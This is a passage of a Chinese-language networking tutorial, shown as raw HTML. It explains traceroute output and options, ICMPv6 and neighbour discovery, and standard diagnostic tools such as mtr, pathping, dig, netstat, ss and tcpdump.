class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">5.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">3</span>  <span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">10</span>.<span class="hljs-number">389</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">10</span>.<span class="hljs-number">234</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">4</span>  <span class="hljs-number">61.152</span>.<span class="hljs-number">54.125</span> (<span class="hljs-number">61.152</span>.<span class="hljs-number">54.125</span>)  <span class="hljs-number">15.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">5</span>  <span class="hljs-number">61.152</span>.<span class="hljs-number">25.90</span> (<span class="hljs-number">61.152</span>.<span class="hljs-number">25.90</span>)  <span class="hljs-number">20.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">20</span>.<span class="hljs-number">389</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">20</span>.<span class="hljs-number">234</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">6</span>  <span class="hljs-number">202.97</span>.<span class="hljs-number">33.106</span> (<span class="hljs-number">202.97</span>.<span class="hljs-number">33.106</span>)  <span class="hljs-number">25.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">25</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">25</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">7</span>  * * *<br> <span class="hljs-number">8</span>  <span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span> (<span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span>)  <span class="hljs-number">45.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">9</span>  <span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span> (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>)  <span class="hljs-number">50.123</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">50</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">50</span>.<span class="hljs-number">045</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">解析：</span><br><span class="hljs-title"></span><br><span class="hljs-title">第一行：</span><br><span class="hljs-title">traceroute</span> to google.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">60</span> byte packets<br>- 目标：google.com (<span class="hljs-number">142.250</span>.<span class="hljs-number">185.14</span>)<br>- 最大跳数：<span class="hljs-number">30</span><br>- 包大小：<span class="hljs-number">60</span>字节<br><br>每一跳：<br><span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>)  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br><span class="hljs-title">│        │           │          │          │          │</span><br><span class="hljs-title">│        │           │          └──────────┴──────────┴─ 3</span>次往返时间<br>│        │           └─ 主机名（如果能解析）<br>│        └─ IP地址<br>└─ 跳数<br><br>特殊情况：<br><br><span class="hljs-number">1</span>. * * *<br>   <span class="hljs-number">7</span>  * * *<br>   → 该跳路由器不响应或被过滤<br><br><span class="hljs-number">2</span>. 请求超时后跳过<br>   <span class="hljs-number">7</span>  * * *<br>   <span class="hljs-number">8</span>  <span class="hljs-number">108.170</span>.<span class="hljs-number">252.1</span>  <span class="hljs-number">45.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">45</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">→ 第7</span>跳无响应，但第<span class="hljs-number">8</span>跳可达（中间路由器被配置为不响应）<br><br><span class="hljs-number">3</span>. 延迟突然增加<br>   <span class="hljs-number">5</span>  ...  <span class="hljs-number">20.234</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">6</span>  ...  <span class="hljs-number">25.178</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">7</span>  ...  <span class="hljs-number">80.456</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">← 突然增加</span><br><span class="hljs-title">   → 可能的原因：</span><br><span class="hljs-title">     - 跨越长距离链路</span><br><span class="hljs-title">     - 卫星链路</span><br><span class="hljs-title">     - 拥塞</span><br><span class="hljs-title">     - 路由器负载高</span><br><span class="hljs-title"></span><br><span class="hljs-title">4</span>. 多个IP地址<br>   <span class="hljs-number">3</span>  <span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.456</span> <span class="hljs-keyword">ms</span><br>      <span class="hljs-title">172</span>.<span class="hljs-number">16.0</span>.<span class="hljs-number">2</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.2</span>)  <span class="hljs-number">10.389</span> <span class="hljs-keyword">ms</span><br>      <span class="hljs-title">172</span>.<span class="hljs-number">16.0</span>.<span class="hljs-number">1</span> (<span class="hljs-number">172.16</span>.<span class="hljs-number">0.1</span>)  <span class="hljs-number">10.234</span> <span class="hljs-keyword">ms</span><br>   <span class="hljs-title">→ 负载均衡或ECMP</span><br></code></pre></td></tr></table></figure><h3 id="3-5-traceroute常用选项"><a href="#3-5-traceroute常用选项" class="headerlink" title="3.5 traceroute常用选项"></a>3.5 traceroute常用选项</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs stylus">常用参数：<br><br>-m max_ttl<br>设置最大TTL（默认<span class="hljs-number">30</span>）<br>traceroute -m <span class="hljs-number">20</span> google<span class="hljs-selector-class">.com</span><br><br>-<span class="hljs-selector-tag">q</span> nqueries<br>每跳发送的包数量（默认<span class="hljs-number">3</span>）<br>traceroute -<span class="hljs-selector-tag">q</span> <span class="hljs-number">5</span> google<span class="hljs-selector-class">.com</span><br><br>-w waittime<br>等待响应的超时时间（秒，默认<span class="hljs-number">5</span>）<br>traceroute -w <span class="hljs-number">2</span> google<span class="hljs-selector-class">.com</span><br><br>-I<br>使用ICMP回显代替UDP（需要root）<br>sudo traceroute -I google<span class="hljs-selector-class">.com</span><br><br>-T<br>使用TCP SYN代替UDP（需要root）<br>sudo traceroute -T google<span class="hljs-selector-class">.com</span><br><br>-<span class="hljs-selector-tag">p</span> port<br>设置起始端口号（默认<span class="hljs-number">33434</span>）<br>traceroute -<span class="hljs-selector-tag">p</span> <span class="hljs-number">40000</span> google<span class="hljs-selector-class">.com</span><br><br>-n<br>不解析主机名，只显示IP<br>traceroute -n google<span class="hljs-selector-class">.com</span><br><br>-A<br>启用AS号查找<br>traceroute -A google<span class="hljs-selector-class">.com</span><br><br>实用技巧：<br><br><span class="hljs-number">1</span>. 快速traceroute：<br>   traceroute -<span class="hljs-selector-tag">q</span> <span class="hljs-number">1</span> -w <span class="hljs-number">1</span> target<br>   每跳只发<span class="hljs-number">1</span>个包，<span class="hljs-number">1</span>秒超时<br><br><span class="hljs-number">2</span>. ICMP方式（更容易通过防火墙）：<br>   sudo traceroute -I target<br><br><span class="hljs-number">3</span>. TCP方式（测试到特定端口）：<br>   sudo traceroute -T -<span class="hljs-selector-tag">p</span> <span class="hljs-number">80</span> target<br>   追踪到<span class="hljs-number">80</span>端口的路径<br><br><span class="hljs-number">4</span>. 不解析域名（更快）：<br>   traceroute -n target<br></code></pre></td></tr></table></figure><hr><h2 id="4-ICMPv6"><a href="#4-ICMPv6" class="headerlink" title="4. ICMPv6"></a>4. ICMPv6</h2><h3 id="4-1-ICMPv6概述"><a href="#4-1-ICMPv6概述" class="headerlink" title="4.1 ICMPv6概述"></a>4.1 ICMPv6概述</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs smali">ICMPv6 = ICMP for IPv6<br><br>相比ICMPv4的变化：<br>✅ 功能更强大<br>✅ 整合了更多功能<br>✅ 必须实现（不是可选）<br>✅ 简化了类型编码<br><br>ICMPv6承担的职责：<br>1. 错误报告（和ICMPv4类似）<br>2. 诊断功能（ping、traceroute）<br>3. 邻居发现（NDP）← 新增！<br>4. 多播组管理（MLD）← 新增！<br><br>协议号：58（IPv6 Next Header）<br></code></pre></td></tr></table></figure><h3 id="4-2-ICMPv6报文类型"><a href="#4-2-ICMPv6报文类型" class="headerlink" title="4.2 ICMPv6报文类型"></a>4.2 ICMPv6报文类型</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ada">类型分类：<br><br><span class="hljs-number">1</span>. 错误消息（<span class="hljs-number">0</span>-<span class="hljs-number">127</span>）：<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">1: </span>目标不可达<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">2: </span>包太大<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">3: </span>超时<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">4: </span>参数问题<br><br><span class="hljs-number">2</span>. 信息消息（<span class="hljs-number">128</span>-<span class="hljs-number">255</span>）：<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">128: </span>回显请求<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">129: </span>回显应答<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">133: </span>路由器请求（RS）<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">134: </span>路由器通告（RA）<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">135: </span>邻居请求（NS）<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">136: </span>邻居通告（NA）<br>   <span class="hljs-keyword">Type</span> <span class="hljs-type">137: </span>重定向<br><br>邻居发现协议（NDP）：<br>- 取代了IPv4的ARP<br>- 使用ICMPv6消息<br>- 类型<span class="hljs-number">133</span>-<span class="hljs-number">137</span><br><br>多播侦听发现（MLD）：<br>- 取代了IPv4的IGMP<br>- 管理多播组成员<br></code></pre></td></tr></table></figure><h3 id="4-3-邻居发现协议（NDP）"><a href="#4-3-邻居发现协议（NDP）" class="headerlink" title="4.3 邻居发现协议（NDP）"></a>4.3 邻居发现协议（NDP）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">NDP功能：<br><span class="hljs-bullet">1.</span> 地址解析（替代ARP）<br><span class="hljs-bullet">2.</span> 路由器发现<br><span class="hljs-bullet">3.</span> 前缀发现<br><span class="hljs-bullet">4.</span> 邻居不可达检测<br><span class="hljs-bullet">5.</span> 重复地址检测（DAD）<br><span class="hljs-bullet">6.</span> 重定向<br><br>工作流程：<br><br><span class="hljs-bullet">1.</span> 邻居请求（NS）+ 邻居通告（NA）：<br>   主机A想发送给主机B<br>   → 发送NS：谁是2001:db8::2？<br>   → 主机B回复NA：我是，我的MAC是xx:xx:xx:xx:xx:xx<br><br><span class="hljs-bullet">2.</span> 路由器请求（RS）+ 路由器通告（RA）：<br>   新主机上线<br>   → 发送RS：有路由器吗？<br>   → 路由器回复RA：我在这，前缀是2001:db8::/64<br><br><span class="hljs-bullet">3.</span> 重复地址检测（DAD）：<br>   主机配置地址前<br>   → 发送NS（目标是自己的地址）<br>   → 如果收到NA：地址冲突！<br>   → 如果无响应：地址可用<br><br>对比ARP：<br>┌─────────────┬──────────────┬──────────────┐<br>│    特性     │     ARP      │     NDP      │<br>├─────────────┼──────────────┼──────────────┤<br>│ 协议        │  独立协议    │  ICMPv6      │<br>│ 广播        │    使用      │   不使用     │<br>│ 多播        │   不支持     │    使用      │<br>│ 额外功能    │    无        │  路由发现等  │<br>│ 安全        │    较差      │   可加密     │<br>└─────────────┴──────────────┴──────────────┘<br></code></pre></td></tr></table></figure><h3 id="4-4-ping6-和-traceroute6"><a href="#4-4-ping6-和-traceroute6" class="headerlink" title="4.4 ping6 和 traceroute6"></a>4.4 ping6 和 traceroute6</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">IPv6版本的诊断工具：<br><br>ping6：<br>- 类似ping，用于IPv6<br>- 使用ICMPv6 <span class="hljs-keyword">Type</span> <span class="hljs-number">128</span>/<span class="hljs-number">129</span><br>- 命令：ping6 ipv6.google.com<br><br>示例：<br>$ ping6 google.com<br>PING google.com(lax30s04-<span class="hljs-keyword">in</span>-x0e.<span class="hljs-number">1</span>e100.net (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e)) <span class="hljs-number">56</span> data bytes<br><span class="hljs-number">64</span> bytes from lax30s04-<span class="hljs-keyword">in</span>-x0e.<span class="hljs-number">1</span>e100.net (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e): <span class="hljs-attr">icmp_seq=</span><span class="hljs-number">1</span> <span class="hljs-attr">ttl=</span><span class="hljs-number">55</span> <span class="hljs-attr">time=</span><span class="hljs-number">15.2</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">traceroute6</span>：<br>- 类似traceroute，用于IPv6<br>- 命令：traceroute6 ipv6.google.com<br><br>示例：<br>$ traceroute6 google.com<br>traceroute to google.com (<span class="hljs-number">2607</span>:f8b0:<span class="hljs-number">4005</span>:<span class="hljs-number">80</span>a::<span class="hljs-number">200</span>e), <span class="hljs-number">30</span> hops max, <span class="hljs-number">80</span> byte packets<br> <span class="hljs-number">1</span>  fe80::<span class="hljs-number">1</span>  <span class="hljs-number">1.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">156</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">089</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">2</span>  <span class="hljs-number">2001</span>:db8::<span class="hljs-number">1</span>  <span class="hljs-number">5.234</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">178</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">123</span> <span class="hljs-keyword">ms</span><br> <span class="hljs-title">...</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-其他网络诊断工具"><a href="#5-其他网络诊断工具" class="headerlink" title="5. 其他网络诊断工具"></a>5. 其他网络诊断工具</h2><h3 id="5-1-pathping-mtr"><a href="#5-1-pathping-mtr" class="headerlink" title="5.1 pathping &#x2F; mtr"></a>5.1 pathping &#x2F; mtr</h3><p><strong>Windows pathping</strong>：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tap">pathping = ping + traceroute<br><br>功能：<br>- 结合ping和traceroute<br>- 显示每一跳的丢包率<br>- 长时间统计（默认25秒每跳）<br><br>使用：<br>C:\&gt; pathping google.com<br><br>输出：<br>Tracing route to google.com [142.250.185.14]<br>over a maximum of<span class="hljs-number"> 30 </span>hops:<br> <span class="hljs-number"> 0 </span> MYCOMPUTER [192.168.1.100]<br> <span class="hljs-number"> 1 </span> 192.168.1.1<br> <span class="hljs-number"> 2 </span> 10.0.0.1<br>  ...<br><br>Computing statistics for<span class="hljs-number"> 50 </span>seconds...<br>            Source to Here   This Node/Link<br>Hop  RTT    Lost/Sent = Pct  Lost/Sent = Pct  Address<br> <span class="hljs-number"> 0 </span>                                          MYCOMPUTER [192.168.1.100]<br>                                0/<span class="hljs-number"> 100 </span>=  0%   |<br> <span class="hljs-number"> 1 </span>   1ms     0/<span class="hljs-number"> 100 </span>=  0%     0/<span class="hljs-number"> 100 </span>=  0%  192.168.1.1<br>                                0/<span class="hljs-number"> 100 </span>=  0%   |<br> <span class="hljs-number"> 2 </span>   5ms     2/<span class="hljs-number"> 100 </span>=  2%     2/<span class="hljs-number"> 100 </span>=  2%  10.0.0.1<br>                                5/<span class="hljs-number"> 100 </span>=  5%   |<br> <span class="hljs-number"> 3 </span>  15ms     5/<span class="hljs-number"> 100 </span>=  5%     3/<span class="hljs-number"> 100 </span>=  3%  172.16.0.1<br></code></pre></td></tr></table></figure><p><strong>Linux&#x2F;Unix mtr</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ldif">mtr = My TraceRoute<br><br>功能：<br><span class="hljs-literal">-</span> 实时更新的traceroute<br><span class="hljs-literal">-</span> 持续监控每一跳<br><span class="hljs-literal">-</span> 显示丢包率和延迟统计<br><span class="hljs-literal">-</span> 交互式界面<br><br>使用：<br>$ mtr google.com<br><br>输出：<br>                             My traceroute  [v0.93]<br>MYCOMPUTER (192.168.1.100)                          2025-11-05T10:00:00+0000<br><span class="hljs-attribute">Keys</span>:  Help   Display mode   Restart statistics   Order of fields   quit<br>                                       Packets               Pings<br> Host                                Loss%   Snt   Last   Avg  Best  Wrst StDev<br> 1. 192.168.1.1                       0.0%   100    1.2   1.3   1.0   2.0   0.2<br> 2. 10.0.0.1                          2.0%   100    5.1   5.3   4.8   8.0   0.5<br> 3. 172.16.0.1                        5.0%   100   15.2  15.5  14.0  20.0   1.2<br> 4. 61.152.54.125                     0.0%   100   20.1  20.3  19.0  25.0   1.0<br> 5. google.com                        0.0%   100   50.2  50.5  49.0  55.0   1.5<br><br>实用选项：<br><span class="hljs-literal">-</span>r  <span class="hljs-comment"># 报告模式（非交互）</span><br><span class="hljs-literal">-</span>c 100  <span class="hljs-comment"># 发送100个包后停止</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># 不解析主机名</span><br><span class="hljs-literal">-</span>b  <span class="hljs-comment"># 显示主机名和IP</span><br><br>示例：<br>mtr -r -c 50 google.com &gt; report.txt<br></code></pre></td></tr></table></figure><h3 id="5-2-nslookup-dig-host"><a href="#5-2-nslookup-dig-host" class="headerlink" title="5.2 nslookup &#x2F; dig &#x2F; host"></a>5.2 nslookup &#x2F; dig &#x2F; host</h3><p><strong>DNS诊断工具</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ldif">nslookup：<br><span class="hljs-literal">-</span> 查询DNS记录<br><span class="hljs-literal">-</span> 跨平台<br><br>使用：<br>$ nslookup google.com<br><span class="hljs-attribute">Server</span>:8.8.8.8<br><span class="hljs-attribute">Address</span>:8.8.8.8<span class="hljs-comment">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-attribute">Name</span>:google.com<br><span class="hljs-attribute">Address</span>: 142.250.185.14<br><br>dig：<br><span class="hljs-literal">-</span> 更强大的DNS工具<br><span class="hljs-literal">-</span> 详细输出<br><span class="hljs-literal">-</span> Linux/Unix<br><br>使用：<br>$ dig google.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; google.com<br>;; ANSWER SECTION:<br>google.com.299INA142.250.185.14<br><br>host：<br><span class="hljs-literal">-</span> 简单DNS查询<br><span class="hljs-literal">-</span> 快速查询<br><br>使用：<br>$ host google.com<br>google.com has address 142.250.185.14<br>google.com has IPv6 address 2607:f8b0:4005:80a::200e<br></code></pre></td></tr></table></figure><h3 id="5-3-netstat-ss"><a href="#5-3-netstat-ss" class="headerlink" title="5.3 netstat &#x2F; ss"></a>5.3 netstat &#x2F; ss</h3><p><strong>连接状态查看</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ldif">netstat（老工具）：<br><span class="hljs-literal">-</span> 显示网络连接<br><span class="hljs-literal">-</span> 显示路由表<br><span class="hljs-literal">-</span> 显示接口统计<br><br>常用选项：<br><span class="hljs-literal">-</span>a  <span class="hljs-comment"># 所有连接</span><br><span class="hljs-literal">-</span>t  <span class="hljs-comment"># TCP连接</span><br><span class="hljs-literal">-</span>u  <span class="hljs-comment"># UDP连接</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># 数字格式（不解析）</span><br><span class="hljs-literal">-</span>p  <span class="hljs-comment"># 显示进程</span><br><span class="hljs-literal">-</span>r  <span class="hljs-comment"># 路由表</span><br><span class="hljs-literal">-</span>i  <span class="hljs-comment"># 接口统计</span><br><br>示例：<br>netstat -antp  <span class="hljs-comment"># 所有TCP连接，显示进程</span><br><br>ss（新工具，更快）：<br><span class="hljs-literal">-</span> netstat的现代替代品<br><span class="hljs-literal">-</span> 更快，功能更强<br><br>常用选项：<br><span class="hljs-literal">-</span>a  <span class="hljs-comment"># 所有套接字</span><br><span class="hljs-literal">-</span>t  <span class="hljs-comment"># TCP</span><br><span class="hljs-literal">-</span>u  <span class="hljs-comment"># UDP</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># 数字格式</span><br><span class="hljs-literal">-</span>p  <span class="hljs-comment"># 显示进程</span><br><span class="hljs-literal">-</span>l  <span class="hljs-comment"># 监听套接字</span><br><br>示例：<br>ss -antp  <span class="hljs-comment"># 所有TCP连接，显示进程</span><br>ss -s  <span class="hljs-comment"># 统计摘要</span><br></code></pre></td></tr></table></figure><h3 id="5-4-tcpdump-wireshark"><a href="#5-4-tcpdump-wireshark" class="headerlink" title="5.4 tcpdump &#x2F; wireshark"></a>5.4 tcpdump &#x2F; wireshark</h3><p><strong>抓包分析工具</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs ldif">tcpdump：<br><span class="hljs-literal">-</span> 命令行抓包工具<br><span class="hljs-literal">-</span> 强大的过滤器<br><span class="hljs-literal">-</span> 适合服务器<br><br>基本使用：<br>tcpdump -i eth0  <span class="hljs-comment"># 抓取eth0接口</span><br>tcpdump icmp  <span class="hljs-comment"># 只抓ICMP包</span><br>tcpdump host google.com  <span class="hljs-comment"># 指定主机</span><br>tcpdump port 80  <span class="hljs-comment"># 指定端口</span><br><br>常用选项：<br><span class="hljs-literal">-</span>i interface  <span class="hljs-comment"># 指定接口</span><br><span class="hljs-literal">-</span>c count  <span class="hljs-comment"># 抓取数量</span><br><span 